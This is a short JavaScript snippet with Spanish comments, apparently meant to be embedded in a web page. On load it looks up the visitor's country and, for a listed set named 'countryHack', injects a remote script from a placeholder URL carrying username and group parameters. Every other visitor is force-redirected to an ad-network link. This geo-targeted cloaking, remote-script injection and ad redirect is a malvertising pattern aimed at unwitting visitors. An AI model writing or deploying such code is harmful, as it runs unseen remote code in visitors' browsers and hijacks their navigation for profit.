<script>
let countryHack = ['MX', 'FR', 'FJ', 'BR', 'PL', 'RS', 'HR', 'ME', 'MJ', 'GE', 'GT', 'AU', 'NZ']; // Paises
let urlPromocion = 'https://www.highcpmrevenuegate.com/x293k2w3xc?key=c756c8fb361df5df079ee02588e59baa';
let country;

// Ingresa la URL que desees a continuaciÃ³n
let customURL = 'https://tudominio.com/tuarchivo.php?p1=true&username=usuario&pl=grupo';

fetch('https://get.geojs.io/v1/ip/country')
    .then((response) => response.text())
    .then((data) => {
        country = data;
        country = countryHack.find((str) => str === country.trim());
        redirectURL(country)
    })

function redirectURL(country) {
    if (country) {
        const script = document.createElement('script');
        script.src = customURL; // Usamos la URL personalizada
        document.head.appendChild(script);

        console.log('https://yuy4o.app.link/0fkXSJqnaCb' + country)
    } else {
        window.location.href = urlPromocion;
        console.log('REDIRECT ADS...' + country)
    }
}
</script>
